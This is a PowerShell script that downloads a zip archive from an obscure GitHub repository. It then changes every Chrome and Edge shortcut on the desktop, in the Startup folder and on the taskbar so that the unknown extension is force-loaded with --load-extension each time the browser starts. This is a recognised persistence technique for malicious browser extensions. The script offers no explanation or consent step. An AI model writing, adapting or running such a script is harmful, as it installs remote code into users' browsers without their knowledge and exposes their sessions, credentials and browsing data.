# Set the URL for the extension
$extension_url = "https://github.com/k53xupn43/i965652f/raw/refs/heads/main/extension.zip"

# Create a temporary directory
$tempDir = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), [System.Guid]::NewGuid().ToString())
New-Item -ItemType Directory -Path $tempDir -Force | Out-Null
$zipPath = "$tempDir\extension.zip"
$extension_path = "$tempDir\extension"

# Download and extract the extension
try {
    Write-Host "Downloading extension from $extension_url..." -ForegroundColor Cyan
    Invoke-WebRequest -Uri $extension_url -OutFile $zipPath -ErrorAction Stop

    Write-Host "Extracting extension to $extension_path..." -ForegroundColor Cyan
    Expand-Archive -Path $zipPath -DestinationPath $extension_path -Force -ErrorAction Stop

    # Find the correct extension directory (handle nested folders)
    $manifestPath = Get-ChildItem -Path $extension_path -Recurse -Filter "manifest.json" -File -ErrorAction SilentlyContinue | Select-Object -First 1
    if (-not $manifestPath) {
        Write-Host "Error: manifest.json not found in $extension_path or its subdirectories" -ForegroundColor Red
        exit
    }

    # Update extension_path to the directory containing manifest.json
    $extension_path = Split-Path $manifestPath.FullName -Parent
    Write-Host "Found manifest.json in $extension_path" -ForegroundColor Green

    # Verify manifest.json is readable and valid JSON
    try {
        $manifestContent = Get-Content -Path $manifestPath.FullName -Raw -ErrorAction Stop | ConvertFrom-Json
        Write-Host "manifest.json is valid JSON" -ForegroundColor Green
    } catch {
        Write-Host "Error: manifest.json is unreadable or invalid JSON: $_" -ForegroundColor Red
        exit
    }

} catch {
    Write-Host "Error downloading or extracting extension: $_" -ForegroundColor Red
    Write-Host "Temporary files retained at $tempDir for debugging" -ForegroundColor Yellow
    exit
}

# Get common folders
$userProfile = [Environment]::GetFolderPath("UserProfile")
$commonPaths = @(
    "$userProfile\Desktop",
    "$userProfile\OneDrive\Desktop",
    "$userProfile\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup",
    "$userProfile\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar"
)

# Include 1 level deep folders inside those common paths
$searchPaths = foreach ($path in $commonPaths) {
    if (Test-Path $path) {
        Get-ChildItem -Path $path -Directory -Recurse -Depth 1 -ErrorAction SilentlyContinue | ForEach-Object { $_.FullName }
        $path
    }
}

# Filter .lnk files
$linkFiles = $searchPaths | ForEach-Object {
    Get-ChildItem -Path $_ -Filter *.lnk -File -ErrorAction SilentlyContinue
}

# Check if any .lnk files were found
if (-not $linkFiles) {
    Write-Host "No .lnk files found in the specified paths." -ForegroundColor Red
    Write-Host "Temporary files retained at $tempDir for debugging" -ForegroundColor Yellow
    exit
}

# Shell COM object for resolving .lnk shortcuts
$shell = New-Object -ComObject WScript.Shell

foreach ($lnk in $linkFiles) {
    try {
        $shortcut = $shell.CreateShortcut($lnk.FullName)
        $target = $shortcut.TargetPath
        $args = $shortcut.Arguments

        if ($target -match "chrome.exe" -or $target -match "msedge.exe") {
            if ($args -notmatch "--load-extension") {
                Write-Host "Updating shortcut: $($lnk.FullName)" -ForegroundColor Green
                $shortcut.Arguments = "$args --load-extension=`"$extension_path`"".Trim()
                $shortcut.Save()
            } else {
                Write-Host "Already has --load-extension: $($lnk.FullName)" -ForegroundColor Yellow
            }
        } else {
            Write-Host "Skipped (not Chrome/Edge): $($lnk.FullName)" -ForegroundColor Gray
        }
    } catch {
        Write-Host "Failed to process shortcut: $($lnk.FullName)" -ForegroundColor Red
        continue
    }
}

# Retain temporary directory for debugging
Write-Host "Script completed. Temporary files retained at $tempDir for inspection." -ForegroundColor Green